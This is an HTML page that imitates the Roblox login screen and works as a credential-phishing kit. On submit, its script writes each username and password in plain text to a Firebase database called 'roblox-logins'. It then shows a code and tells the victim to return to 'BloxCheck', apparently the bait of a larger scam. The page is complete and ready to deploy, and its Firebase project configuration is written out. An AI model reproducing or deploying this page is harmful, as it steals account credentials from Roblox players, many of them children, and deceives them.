<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Product+Sans:wght@400;600&family=Roboto:wght@100;300&display=swap" rel="stylesheet">
  <style>
    /* Your existing styles... */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: rgb(18, 18, 21);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
    }
    .login-container {
      background: #27282e;
      padding: 40px 60px;
      border-radius: 0px;
      width: 100%;
      max-width: 500px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    .login-title {
      font-family: 'Product Sans', sans-serif;
      font-size: 36px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 30px;
      color: #ffffff;
    }
    .input-field {
      width: 100%;
      padding: 10px 20px;
      background: rgb(60, 62, 71);
      border: 1px solid rgb(72, 74, 85);
      border-radius: 8px;
      margin-bottom: 16px;
      color: #b0b0b0;
      font-family: 'Roboto', sans-serif;
      font-size: 16px;
      font-weight: 100;
      outline: none;
    }
    .input-field::placeholder {
      color: #b0b0b0;
    }
    .input-field:focus {
      background: #525252;
    }
    .login-button {
      width: 100%;
      padding: 10px;
      background: rgb(39, 41, 47);
      border: 1px solid rgb(213, 215, 220);
      border-radius: 8px;
      color: white;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 20px;
    }
    .login-button:hover {
      background: #4a4a4a;
      border-color: #777777;
    }
    .forgot-link {
      text-align: center;
      margin-bottom: 30px;
    }
    .forgot-link a {
      color: #ffffff;
      text-decoration: none;
      font-size: 16px;
    }
    .forgot-link a:hover {
      color: #cccccc;
    }
    .separator {
      border-top: 1px solid #525252;
      margin: 30px 0;
    }
    .secondary-button {
      width: 100%;
      padding: 10px;
      background: rgb(60, 62, 71);
      border: none;
      border-radius: 8px;
      color: #e0e0e0;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 16px;
    }
    .secondary-button:hover {
      background: #555555;
    }
    .signup-link {
      text-align: center;
      margin-top: 20px;
    }
    .signup-link a {
      color: #ffffff;
      text-decoration: none;
      font-size: 16px;
    }
    .signup-link a:hover {
      color: #cccccc;
    }
  </style>
</head>
<body>
  <div class="login-container" id="form-container">
    <h1 class="login-title">Login to Roblox</h1>
    <form id="login-form">
      <input type="text" id="username" class="input-field" placeholder="Username/Email/Phone" required />
      <input type="password" id="password" class="input-field" placeholder="Password" required />
      <button type="submit" class="login-button">Log In</button>
    </form>
    <div class="forgot-link">
      <a href="#">Forgot Password or Username?</a>
    </div>
    <div class="separator"></div>
    <button class="secondary-button">Email Me a One-Time Code</button>
    <button class="secondary-button">Use Another Device</button>
    <div class="signup-link">
      <a href="#">Don't have an account? Sign Up</a>
    </div>
  </div>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAQoaJi7GT6UUOvtZON73lhd_7ZdFipEzU",
      authDomain: "roblox-logins.firebaseapp.com",
      databaseURL: "https://roblox-logins-default-rtdb.firebaseio.com",
      projectId: "roblox-logins",
      storageBucket: "roblox-logins.firebasestorage.app",
      messagingSenderId: "793025287865",
      appId: "1:793025287865:web:3abdf21fb1719489b0ed68",
      measurementId: "G-9KM651QMG4"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function generateUID() {
      return 'xxxx-4xxx-yxxx-xxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
    }

    document.getElementById("login-form").addEventListener("submit", async function(event) {
      event.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const uid = generateUID();

      try {
        await db.ref("logins/" + uid).set({ username, password, uid });

        document.body.innerHTML = `
          <div style="display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;flex-direction:column;color:white;font-family:'Segoe UI',sans-serif;">
            ✅ Please go back to BloxCheck and enter your code.<br/><br/>
            <strong>Your unique ID code is:</strong><br/>
            <span style="font-size: 28px; font-weight: bold; color: #00ffcc; margin-top: 8px;">${uid}</span><br/><br/>
            <em>Please screenshot or save this ID. You won’t see it again.</em>
          </div>`;
      } catch (error) {
        alert("Something went wrong. Try again.");
        console.error(error);
      }
    });
  </script>
</body>
</html>
